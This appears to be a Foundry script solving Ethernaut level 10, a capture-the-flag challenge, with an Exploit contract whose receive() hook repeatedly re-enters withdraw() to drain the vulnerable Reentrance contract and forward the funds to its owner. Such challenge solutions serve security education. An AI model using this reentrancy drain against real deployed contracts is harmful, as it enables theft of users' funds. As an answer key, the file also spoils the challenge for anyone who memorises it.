// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Reentrance} from "src/10/Reentrance.sol";
import {ReentranceFactory} from "src/10/ReentranceFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

contract ReentranceExploit is Script {
    address public levelFactory;
    HelperConfig public config;
    uint256 constant MIN_ETH_AMOUNT = 0.001 ether;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL10_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new ReentranceFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig{value: MIN_ETH_AMOUNT}(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract

        uint256 initialDonation = 0.5 ether;

        Exploit exploit = new Exploit{value: initialDonation}(Reentrance(instance));
        exploit.attack();

        exploit.withdrawToOwner();

        require(instance.balance == 0, "Attack failed");

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}

contract Exploit {
    Reentrance instance;
    uint256 value;
    address owner;

    constructor(Reentrance _instance) payable {
        instance = _instance;
        value = msg.value;
        owner = msg.sender;
    }

    function attack() external {
        instance.donate{value: value}(address(this));
        instance.withdraw(value);
    }

    function withdrawToOwner() external {
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Call failed");
    }

    receive() external payable {
        if (address(instance).balance > 0) {
            uint256 withdrawAmount = msg.value;
            if (withdrawAmount > address(instance).balance) {
                withdrawAmount = address(instance).balance;
            }
            instance.withdraw(withdrawAmount);
        }
    }
}
